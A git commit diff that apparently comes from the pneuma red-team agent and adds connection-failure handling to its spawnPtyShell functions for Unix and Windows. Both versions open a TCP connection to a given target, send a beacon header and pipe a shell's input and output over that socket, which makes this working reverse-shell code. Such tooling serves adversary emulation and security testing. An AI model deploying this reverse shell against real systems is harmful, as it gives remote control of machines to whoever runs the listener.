23a4faf6c5c5a0a30ca22ab34f10674ad960164e
Alex <43142871+khyberspache@users.noreply.github.com>
2021-05-07 17:32:11 -0400

    fixing conn failure case on shell (#61)
    * fixing conn failure case on shell
    * Cleaner error responses

--- commands/pty/pty_other.go
+++ commands/pty/pty_other.go
@@ -9,23 +9,27 @@ import (
 	"io"
 	"net"
 	"os/exec"
-	"strings"
 )
 
 func spawnPtyShell(target, executor string, agent *util.AgentConfig) (int, int, error) {
-	conn, _ := net.Dial("tcp", strings.Trim(target, "\""))
-	header, err := agent.BuildSocketBeacon("pty")
-	if err == nil {
-		ctx, cancel := context.WithCancel(context.Background())
-		ptyShell := exec.CommandContext(ctx, executor)
-		ptmx, _ := shell.Start(ptyShell)
-		go cancelOnSocketClose(cancel, conn)
-		conn.Write(header)
-		go func() {
-			go io.Copy(ptmx, conn)
-			io.Copy(conn, ptmx)
-		}()
-		return ptyShell.Process.Pid, 0, nil
+	conn, err := net.Dial("tcp", target)
+	if err != nil {
+		return agent.Pid, 1, err
 	}
-	return agent.Pid, 1, err
+
+	header, err := agent.BuildSocketBeacon("pty")
+	if err != nil {
+		return agent.Pid, 1, err
+	}
+
+	ctx, cancel := context.WithCancel(context.Background())
+	ptyShell := exec.CommandContext(ctx, executor)
+	ptmx, _ := shell.Start(ptyShell)
+	go cancelOnSocketClose(cancel, conn)
+	conn.Write(header)
+	go func() {
+		go io.Copy(ptmx, conn)
+		io.Copy(conn, ptmx)
+	}()
+	return ptyShell.Process.Pid, 0, nil
 }
--- commands/pty/pty_windows.go
+++ commands/pty/pty_windows.go
@@ -5,23 +5,27 @@ import (
 	"github.com/preludeorg/pneuma/util"
 	"net"
 	"os/exec"
-	"strings"
 )
 
 func spawnPtyShell(target, executor string, agent *util.AgentConfig) (int, int, error) {
+	conn, err := net.Dial("tcp", target)
+	if err != nil {
+		return agent.Pid, 1, err
+	}
 	header, err := agent.BuildSocketBeacon("piped")
-	if err == nil {
-		ctx, cancel := context.WithCancel(context.Background())
-		shell := exec.CommandContext(ctx, executor)
-		conn, _ := net.Dial("tcp", strings.Trim(target, "\""))
-		go cancelOnSocketClose(cancel, conn)
-		conn.Write(header)
-		shell.Stdout = conn
-		shell.Stdin = conn
-		shell.Stderr = conn
-		if err = shell.Start(); err == nil {
-			return shell.Process.Pid, 0, nil
-		}
+	if err != nil {
+		return agent.Pid, 1, err
+	}
+	
+	ctx, cancel := context.WithCancel(context.Background())
+	shell := exec.CommandContext(ctx, executor)
+	go cancelOnSocketClose(cancel, conn)
+	conn.Write(header)
+	shell.Stdout = conn
+	shell.Stdin = conn
+	shell.Stderr = conn
+	if err = shell.Start(); err == nil {
+		return shell.Process.Pid, 0, nil
 	}
 	return agent.Pid, 1, err
 }
